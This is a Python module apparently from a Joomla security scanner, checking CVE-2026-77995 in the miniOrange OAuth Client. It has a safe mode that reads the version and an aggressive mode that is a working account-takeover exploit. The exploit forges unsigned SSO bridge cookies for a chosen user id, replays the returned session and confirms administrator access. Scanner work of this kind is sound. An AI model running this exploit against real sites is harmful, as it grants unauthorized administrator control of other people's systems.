from __future__ import annotations

import base64
import re
from typing import Any

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-77995"
NAME = "miniOrange OAuth Client SSO bridge cookie account takeover"
COMPONENT = "miniOrange OAuth Client"
AFFECTED_RULE = "miniOrange OAuth Client 1.0.0 through 3.1.9; fixed in 3.2.0"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
MANIFEST_PATH = "/administrator/components/com_miniorange_oauth/miniorange_oauth.xml"
ADMIN_PATH = "/administrator/index.php"
ADMIN_MARKERS = ("com_cpanel", "Control Panel", "task=logout", "joomla-dashboard")
LOGIN_MARKERS = ("mod-login-username", "form-login")


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    fixed = parse_version_safe("3.2.0")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def _version_from_manifest(body: str) -> str | None:
    match = re.search(r"<version>\s*([0-9]+(?:\.[0-9]+)+)\s*</version>", body or "", re.IGNORECASE)
    return match.group(1) if match else None


def _component_version(client: HttpClient, base: str, timeout: int) -> str | None:
    response = client.get(f"{base}{MANIFEST_PATH}", timeout=timeout)
    if is_transport_error(response):
        return None
    return _version_from_manifest(str(response.get("body") or ""))


def _session_cookie(response: dict[str, Any]) -> str:
    """Return the fresh Joomla session cookie from a bridge response."""
    headers = response.get("headers_multi") or response.get("headers") or {}
    values = headers.get("set-cookie") or headers.get("Set-Cookie") or [] if isinstance(headers, dict) else []
    if isinstance(values, str):
        values = [values]
    for value in values:
        lowered = str(value).lower()
        if "expires=" in lowered or "max-age=0" in lowered:
            continue
        first = str(value).split(";", 1)[0]
        name, separator, cookie_value = first.partition("=")
        if separator and name.strip().lower() not in {"mo_site", "session_id", "user_id"}:
            return f"{name.strip()}={cookie_value.strip()}"
    return ""


def passive_result(plugins: dict[str, Any] | None = None) -> Finding:
    """Return the offline baseline; the live version is read in check()."""
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_DETECTED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        detail="No miniOrange OAuth Client version has been read from the target yet.",
        action="Run a scan to read the public component manifest.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    url = f"{base}{MANIFEST_PATH}"
    response = client.get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=url, detail=f"The miniOrange manifest could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    version = _version_from_manifest(str(response.get("body") or ""))
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected miniOrange OAuth Client {version}; releases before 3.2.0 trust unsigned SSO bridge cookies."
        action = "Upgrade miniOrange OAuth Client to 3.2.0 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected miniOrange OAuth Client {version}, which signs SSO bridge cookies and checks a server-side session row."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "The miniOrange manifest was reachable but no version could be read."
        action = "Determine the installed miniOrange OAuth Client version and upgrade to 3.2.0 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=url, detail=detail, action=action)


def run_aggressive_probe(
    target_url: str,
    user_id: int = 1,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Set the SSO bridge cookies and check for an authenticated admin session.

    Joomla site and administrator applications use different session cookie
    names, so the bridge must be triggered on the administrator application.
    The cookies are sent as an explicit header (the plugin clears them with
    the Secure flag, which plain-HTTP clients keep) and the fresh session
    cookie from the response is replayed on the follow-up request.
    """
    base = normalize_url(target_url)
    version_probe = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    if version_probe.status == "NOT_AFFECTED":
        version_probe.detail += " Aggressive proof skipped because the detected release already signs SSO bridge cookies."
        return version_probe

    client = HttpClient(timeout=timeout, proxy=proxy)
    bridge = {
        "mo_site": "site",
        "session_id": base64.b64encode(b"proofcms-bridge").decode(),
        "user_id": base64.b64encode(str(user_id).encode()).decode(),
    }
    bridge_header = "; ".join(f"{name}={value}" for name, value in bridge.items())
    first_url = f"{base}{ADMIN_PATH}"
    first = client.request(first_url, headers={"Cookie": bridge_header}, timeout=timeout, follow_redirects=False)
    if is_transport_error(first):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=first_url, detail=f"The SSO bridge request failed in transit ({transport_error_detail(first)}).", action="Retry when the target is reachable.")

    session_cookie = _session_cookie(first)
    headers = {"Cookie": session_cookie} if session_cookie else {}
    admin = client.get(f"{base}{ADMIN_PATH}", headers=headers, timeout=timeout)
    if is_transport_error(admin):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=first_url, detail=f"The post-bridge administrator request failed in transit ({transport_error_detail(admin)}).", action="Retry when the target is reachable.")

    body = str(admin.get("body") or "")
    authenticated = any(marker in body for marker in ADMIN_MARKERS)
    login_form = any(marker in body for marker in LOGIN_MARKERS)
    evidence = {
        "user_id": user_id,
        "bridge_first_status": first.get("status"),
        "admin_status": admin.get("status"),
        "authenticated": authenticated,
        "login_form": login_form,
        "session_cookie_replayed": bool(session_cookie),
    }
    if authenticated and not login_form:
        return Finding(cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED", component=COMPONENT, component_version=version_probe.component_version, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=first_url, evidence=evidence, detail=f"Unsigned SSO bridge cookies authenticated administrator session for user id {user_id}; the control panel loaded without a login form.", action="Upgrade miniOrange OAuth Client to 3.2.0 or newer and rotate administrator credentials.")
    if login_form:
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, component_version=version_probe.component_version, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=first_url, evidence=evidence, detail="The bridge cookies were accepted but the administrator session stayed anonymous. The 3.1.4 GitHub build's getIdentity($id) branch ignores the id on every stock Joomla release; the lab forces the plugin's own J3 branch with a documented shim.", action="Upgrade to 3.2.0; treat the signed-cookie fix as authoritative.")
    return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, component_version=version_probe.component_version, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=first_url, evidence=evidence, detail="The administrator session did not show the login form or an authenticated dashboard after the bridge request.", action="Review the bridge response and the target's session configuration.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    if not run_exploit_check:
        return passive_result(plugins)
    if exploit_mode == "aggressive":
        result = run_aggressive_probe(
            target_url,
            user_id=int(aggressive_value(aggressive_args, aggressive_command, "user_id") or 1),
            timeout=timeout,
            proxy=proxy,
        )
        return result
    if exploit_mode != "safe":
        finding = run_safe_probe(target_url, timeout, proxy)
        finding.detail += " This module supports safe (manifest version) and aggressive (SSO bridge cookie) modes."
        return finding
    return run_safe_probe(target_url, timeout, proxy)


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "Authentication Bypass / CWE-639", "module_version": "1.0.0", "last_reviewed": "2026-11-20", "updated": "2026-11-20", "required_detectors": [], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-77995", "https://github.com/advisories/GHSA-9v52-pgw4-78ww", "https://www.miniorange.com/"]}
